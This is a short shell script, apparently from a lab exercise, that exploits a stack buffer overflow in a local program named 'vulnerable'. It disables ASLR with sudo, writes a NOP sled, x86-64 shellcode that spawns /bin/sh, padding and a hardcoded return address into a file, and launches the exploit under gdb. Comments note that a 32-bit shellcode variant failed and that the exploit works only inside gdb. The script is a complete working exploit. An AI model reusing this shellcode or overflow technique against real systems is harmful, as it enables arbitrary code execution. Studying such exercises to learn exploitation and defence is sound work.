#!/bin/sh

#disables ASLR (not a realistic attack; would probably need to add to environmental variables to bypass)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# 76 char nop sled
perl -e 'print "\x90" x 76' > arg.txt

# 32 char shell code
perl -e 'print "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"' >> arg.txt

#below didnt work. I think it is because I am on a 64 bit vm, not 32
#perl -e 'print "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"' >> arg.txt

# 20 A's for space
perl -e 'print "A" x 20' >> arg.txt

# its address in the code (will be different per system)
#perl -e 'print "\xc0\xdf\xff\xff\xff\x7f"' >> arg.txt
perl -e 'print "\xd0\xdf\xff\xff\xff\x7f"' >> arg.txt

#run the exploit(only works in gdb currently; tried changing location above but hasnt worked yet)
gdb -ex run --args ./vulnerable "`cat arg.txt`"

#reenables ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

echo 'finished'
exit
